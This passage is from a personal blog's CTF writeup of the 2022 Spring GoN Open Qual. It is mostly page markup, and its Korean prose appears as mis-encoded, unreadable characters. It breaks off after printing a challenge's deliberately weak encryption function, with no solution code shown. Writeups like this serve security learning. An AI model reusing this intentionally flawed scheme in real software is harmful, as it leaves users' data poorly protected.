<!DOCTYPE html><html lang="ko" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="2022 Spring GoN Open Qual Writeup" /><meta name="author" content="G0RiyA" /><meta property="og:locale" content="ko" /><meta name="description" content="GoNì—ì„œ ë“œë¦¼í•µì— CTFë¥¼ ì—´ì—ˆë‹¤. í¬ê²Œ í•  ì¼ë„ ì—†ì—ˆê³ , ì¬ë°ŒëŠ” ë¬¸ì œë„ ë§ì•„ ë³´ì´ëŠ” ë°ë‹¤ê°€ ìƒìœ„ 3ëª…ì—ê² ì¹˜í‚¨ë„ ì¤€ëŒ€ì„œ ê½¤ ì—´ì‹¬íˆ ì°¸ì—¬í–ˆë‹¤." /><meta property="og:description" content="GoNì—ì„œ ë“œë¦¼í•µì— CTFë¥¼ ì—´ì—ˆë‹¤. í¬ê²Œ í•  ì¼ë„ ì—†ì—ˆê³ , ì¬ë°ŒëŠ” ë¬¸ì œë„ ë§ì•„ ë³´ì´ëŠ” ë°ë‹¤ê°€ ìƒìœ„ 3ëª…ì—ê² ì¹˜í‚¨ë„ ì¤€ëŒ€ì„œ ê½¤ ì—´ì‹¬íˆ ì°¸ì—¬í–ˆë‹¤." /><link rel="canonical" href="https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/" /><meta property="og:url" content="https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/" /><meta property="og:site_name" content="G0RiyA" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-23T15:00:00+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="2022 Spring GoN Open Qual Writeup" /><meta name="google-site-verification" content="3Nq9VruZBkB9oTqSkann3Hew3z9ngFzj1r0-Kb04MFM" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"G0RiyA"},"description":"GoNì—ì„œ ë“œë¦¼í•µì— CTFë¥¼ ì—´ì—ˆë‹¤. í¬ê²Œ í•  ì¼ë„ ì—†ì—ˆê³ , ì¬ë°ŒëŠ” ë¬¸ì œë„ ë§ì•„ ë³´ì´ëŠ” ë°ë‹¤ê°€ ìƒìœ„ 3ëª…ì—ê² ì¹˜í‚¨ë„ ì¤€ëŒ€ì„œ ê½¤ ì—´ì‹¬íˆ ì°¸ì—¬í–ˆë‹¤.","url":"https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/","@type":"BlogPosting","headline":"2022 Spring GoN Open Qual Writeup","dateModified":"2022-03-24T03:42:02+09:00","datePublished":"2022-03-23T15:00:00+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/"},"@context":"https://schema.org"}</script><title>2022 Spring GoN Open Qual Writeup | G0RiyA</title><link rel="apple-touch-icon" sizes="180x180" href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="><link rel="icon" type="image/png" sizes="32x32" href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="><link rel="icon" type="image/png" sizes="16x16" href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="><meta name="apple-mobile-web-app-title" content="G0RiyA"><meta name="application-name" content="G0RiyA"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><meta name="naver-site-verification" content="6f5bce50b7160f76dbd2054dbf1e03c92f067a77" /> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">G0RiyA</a></div><div class="site-subtitle">ğŸ”¥<br><a href=//guesser.team >@SuperGuesser</a></div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/G0RiyA" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['g0y4ng2','kakao.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>2022 Spring GoN Open Qual Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>2022 Spring GoN Open Qual Writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/G0RiyA">G0RiyA</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-03-23 15:00:00 +0900" data-toggle="tooltip" data-placement="bottom" title="Wed, Mar 23, 2022, 3:00 PM +0900" >Mar 23</em> </span> <span> Updated <em class="timeago" date="2022-03-24 03:42:02 +0900 " data-toggle="tooltip" data-placement="bottom" title="Thu, Mar 24, 2022, 3:42 AM +0900" >Mar 24</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="9604 words"> <em>53 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/post-1/1.png" alt="1.png" data-proofer-ignore> GoNì—ì„œ ë“œë¦¼í•µì— CTFë¥¼ ì—´ì—ˆë‹¤.<br /> í¬ê²Œ í•  ì¼ë„ ì—†ì—ˆê³ , ì¬ë°ŒëŠ” ë¬¸ì œë„ ë§ì•„ ë³´ì´ëŠ” ë°ë‹¤ê°€ ìƒìœ„ 3ëª…ì—ê² ì¹˜í‚¨ë„ ì¤€ëŒ€ì„œ ê½¤ ì—´ì‹¬íˆ ì°¸ì—¬í–ˆë‹¤.</p><p><img data-src="/assets/img/post-1/2.png" alt="2.png" data-proofer-ignore> ëŒ€íšŒëŠ” 2ìœ„ë¡œ ë§ˆë¬´ë¦¬ í–ˆê³ , ì¬ë°Œê²Œ í’€ì—ˆë˜ ë¬¸ì œë“¤ì´ ë§ì•„ì„œ í’€ì´ë¥¼ í•´ë³´ë ¤ê³  í•œë‹¤.</p><hr /><h2 id="a-cs448---crypto">A. CS448 - Crypto<a href="#a-cs448---crypto" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>ìš´ì¢‹ê²Œ í¼ë¸”ë”´ ë¬¸ì œì´ë‹¤.</p><p>ëŒ€ì¶© ë³´ë©´ ì•„ë˜ì™€ ê°™ì€ <code class="language-plaintext highlighter-rouge">encrypt</code>í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ì„œ í”Œë˜ê·¸ë¥¼ ì•”í˜¸í™”í•´ì„œ ì‚¬ìš©ìì—ê²Œ ì „ë‹¬í•œë‹¤.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">k</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">if</span> <span class="n">k</span> <span class="o">&lt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="n">_print</span><span class="p">(</span><span class="s">"[!] key shold be larger then len(pt) for safty!!"</span><span class="p">)</span>
        <span class="k">return</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="n">enc</span> <span class="o">=</span> <span class="p">(</span><span class="n">get_random_u8</span><span class="p">()</span> <span class="o">+</span> <span class="n">key</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xff</span>
        <span class="n">enc</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="n">enc</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">enc</span><span class="p">)[</span><span class="mi">2</span><span class="p">:].</span><span class="n">rjust</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span>
